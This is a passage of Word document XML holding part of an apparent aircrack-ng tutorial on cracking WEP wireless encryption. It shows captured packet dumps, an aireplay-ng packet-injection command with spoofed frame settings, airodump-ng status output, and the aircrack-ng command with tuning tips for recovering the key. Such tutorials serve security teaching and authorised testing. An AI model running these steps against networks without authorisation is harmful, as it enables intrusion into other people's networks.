        <w:t>=  00:14:6C:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="089A1A7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Dest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">. MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  FF:FF:FF:FF:FF:FF</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1AF51A60"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Source MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:09:5B:EC:EE:F2</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="480186A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7D969957"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0x0000:  0841 0201 0014 6c7e 4080 0009 5bec eef2  .A</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....l</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>~@...[...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15858A0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0x0010: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8001 8f00 0000 7af3 8be4  ............z...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0E00D8"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0x0020:  c587 b696 9bf0 c30d 9cd9 c871 0f5a 38c5  ...........</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>q.Z8</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17433C6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0x0030:  f286 fdb3 55ee 113e da14 fb19 17cc </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>0b5e  ....</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>U..&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.......</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>^</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09721943"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0x0040:  6ada 92f2                                j...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793FD5E2"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20FD484C" w14:textId="77777777" w:rsidR="00EB60F0"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Use this </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>packet ?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2FCB559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p>
    <w:p w14:paraId="269E59D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Enter “y” to use this packet. The system responds by showing how many packets it is injecting and reminds you to start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if it has not already been started:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23EA6A59"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replay_src-0204-104917.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FEA3DB"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2DE10C5C"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DA3EC61"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roofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>End of file.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="04B01F9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While this command is successfully running, the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screen will look similar to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B93308"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roofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>CH  9</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> ][ Elapsed: 16 s ][ 2007-02-04 11:04 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E79CD0"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2A77A869"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BSSID              PWR </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>RXQ  Beacons</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B849D9C"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399F3EDE"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47 100      179     2689  336   9  11  WEP  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>WEP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">         BSIDES                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3B9248"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6167A082"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BSSID              STATION            </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>PWR  Lost</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Packets  Probes                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F857896"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1E6FF8C6"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00:09:5B:EC:EE:F2   29     0     2707                                                     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A77515" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B43867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will notice that only one access point is being display since we included an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filter to limit the capture to a single BSSID. Also notice that the station packets are roughly equal to the BSSID data packets. This means injection is working well. Also notice the data rate of 336 packets per </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>second which</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is also an indicator that the injection is working well. This is a pretty “ideal” injection scenario.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488A42EB" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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7B361A58" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="006848FE" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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the BSSID data packets are not increasing, make sure you are still associated with the access point. To do this, follow the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instructions in step 2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="659D8E2A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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p>
    <w:p w14:paraId="6863C62F"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7 - Run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to obtain the WEP key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B6EC9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enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A02052" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1404C91A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008E353E" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</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-b 00:14:6C:7E:40:80 capture*.ca</w:t>
      </w:r>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve">p </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A39FB9" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E33354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2D90B48C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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capture</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>*.cap selects all dump files starting with “capture” and ending in “cap”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236B3614" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63066139"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can run this while generating packets. In a short time, the WEP key will be calculated and presented. Using the PTW method, 40-bit WEP can be cracked with as few as 20,000 data packets and 104-bit WEP with 40,000 data packets. As a reminder, the requirement is that you capture the full packet with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. Meaning, do not use the “--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ivs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>” option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CCBE3F"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Troubleshooting Tips:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77AB37FF" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="006848FE" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Sometimes you need to try various techniques to crack the WEP key. Try ”-n” to set various key lengths. Use ”-f” and try various fudge factors. Use ”-k” and try disabling various </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methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E902BEB" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BF1C0FE" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0485BC66" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Alternate Solution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19994C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must also do a successful fake authentication first.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292153D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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E9A1187" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="779F719C"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-2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AD65A65" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C569DBF" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00954648" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EE860C"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26995626"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p</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0841 sets the Frame Control Field such that the packet looks like it is being sent from a wireless client.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638AB6D6"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FF:FF:FF:FF:FF:FF sets the destination MAC address to be a broadcast. This is required to cause the AP to replay the packet and thus getting the new IV.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B951113"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00BCDDDF"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689870ED" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00203DFA"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3B3127CA"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p>
    <w:p w14:paraId="67D040B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3B4F2ECE"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Read 698 packets...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C36083"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4D5A6CF6"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Size: 86, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>FromDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: 1, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ToDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: 0 (WEP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2112FE5F"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70B556A7"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BSSID  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:14:6C:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="77CA4431"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Dest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">. MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  FF:FF:FF:FF:FF:FF</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="25A71200"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Source MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:D0:CF:03:34:8C</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="156A49C4"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p>
    <w:p w14:paraId="299CADC9"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0x0000:  0842 0000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0014 6c7e 4080  .B..........l~@.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC3B9BA"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0x0010:  00d0 cf03 348c a0f4 2000 0000 e233 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>962a  ....</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>4... ....3.*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B9203D"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0x0020:  90b5 fe67 41e0 9dd5 7271 b8ed ed23 8eda  ...</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>gA</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rq</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>...#</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
